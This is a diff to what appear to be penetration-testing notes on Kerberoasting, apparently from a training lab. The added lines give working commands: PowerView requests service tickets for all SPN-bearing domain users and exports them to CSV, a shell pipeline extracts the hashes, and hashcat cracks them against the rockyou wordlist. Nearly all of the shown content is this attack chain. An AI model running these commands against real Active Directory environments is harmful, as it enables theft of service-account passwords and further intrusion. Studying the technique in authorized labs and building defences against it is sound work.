@@ -54,6 +54,18 @@ Then extract the hash for cracking
 
     Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
+Do to all users with spn:
+
+```powershell
+Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
+```
+```shell
+#then prepare file for hashcat
+cat ilfreight_spns.csv | cut -d ',' -f 8 | python3 -c "import sys; [print(line.strip()) for line in sys.stdin]" | awk '{print substr($0,2,length($0)-2)}'
+#finally run hashcat
+hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
+```
+
 ### Other Information
 
     https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
